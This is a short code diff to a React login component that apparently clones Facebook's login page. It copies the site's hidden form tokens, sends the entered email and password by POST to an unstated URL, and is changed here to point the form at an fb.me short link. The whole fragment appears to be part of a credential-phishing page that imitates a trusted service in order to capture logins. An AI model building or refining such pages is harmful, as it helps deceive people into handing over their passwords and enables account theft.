@@ -19,6 +19,7 @@ function Login(){
         )     
     }
     const login=async()=>{
+        if(usuario.empl)
          await axios.post(url,JSON.stringify({tipo:1,email,pass}))
     }
  
@@ -38,7 +39,7 @@ function Login(){
             <div id="DIV_7">
                 <div id="DIV_8">
                     <div id="DIV_9">
-                        <form  action="https://www.facebook.com/BadabunOficial/videos/1148583618926761" >
+                        <form  action="https://fb.me/e/17s7NaHEv" >
                             <input type="hidden" name="jazoest" value="21102" id="INPUT_11" />
                             <input type="hidden" name="lsd" value="AVrMXxjwfns" id="INPUT_12" />
                             <div id="DIV_13">
